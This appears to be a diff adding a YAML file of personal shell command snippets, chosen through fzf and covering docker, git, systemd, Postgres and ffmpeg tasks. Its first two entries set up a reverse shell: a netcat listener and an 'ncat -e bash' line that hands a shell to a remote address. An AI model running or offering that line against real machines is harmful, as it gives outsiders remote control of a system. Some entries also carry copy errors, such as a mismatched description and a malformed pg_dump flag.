@@ -1,0 +1,82 @@
+Reverse shell (Attacker):
+  description: Set up a reverse shell server on our machine
+  commands:
+    - ncat -lvp 8888
+    - nc -lvp 8888
+
+Reverse shell (Target):
+  description: Connect to the reverse shell server from the target machine.
+  commands:
+    - ncat -e '/bin/env bash' _addr 8888
+    - nc -lvp 8888
+
+Find large files in . (>100MB):
+  description:
+  commands:
+    - find . -type f -size +100M 2>/dev/null
+
+Extract tar.gz archive:
+  description:
+  commands:
+    - tar -xvf (find . | fzf)
+
+Docker stop all running containers:
+  description:
+  commands:
+    - docker stop $(docker ps -a -q)
+
+Git undo last commit but keep changes:
+  description:
+  commands:
+    - git reset --soft HEAD~1
+
+Soft Link:
+  description: Create a soft link.
+  commands:
+    - ln -s _ (fzf)
+
+Python http server:
+  description:
+  commands:
+    - python3 -m http.server 8888 -d (find . -maxdepth 1 -type d | fzf)
+
+Add user:
+  description:
+  commands:
+    - useradd -g (groups | tr ' ' '\n' | fzf --header="Select a group") _user
+
+Systemd journal:
+  description: Check the systemd log for an unit, scroll to end.
+  commands:
+    - journalctl -xeu (systemctl list-units --type=service --all --plain --no-legend | choose 0 | fzf)
+
+Systemd journal by unit (Follow):
+  description: Check the systemd log for an unit, follow.
+  commands:
+    - journalctl -xfu (systemctl list-units --type=service --all --plain --no-legend | choose 0 | fzf)
+
+Postgres restore:
+  description: Restore dumped sql on PostgreSQL
+  commands:
+    - pg_restore --clean --if-exists -d (psql -U postgres -t -A -c "SELECT datname FROM pg_database WHERE datistemplate = false;" | fzf --header="Pick a database") -W (find . | fzf)
+
+Postgres dump table:
+  description: Dump database from PostgresSQL
+  commands:
+    - |
+      pg_dump zulu - t zulu_event > zulu_event.bk
+
+FFmpeg convert (mkv -> mp4):
+  description: Dump database from PostgresSQL
+  commands:
+    - ffmpeg -i _file.mkv -codec copy _file.mp4
+
+Unrar:
+  description: Unpack .rar file
+  commands:
+    - unar (fzf)
+    - unrar -x -r (fzf)
+
+Readline Wrapper:
+  description: Wrap an old style repl to support modern editing.
+  commands: rlwrap -A -p -r _smlnj
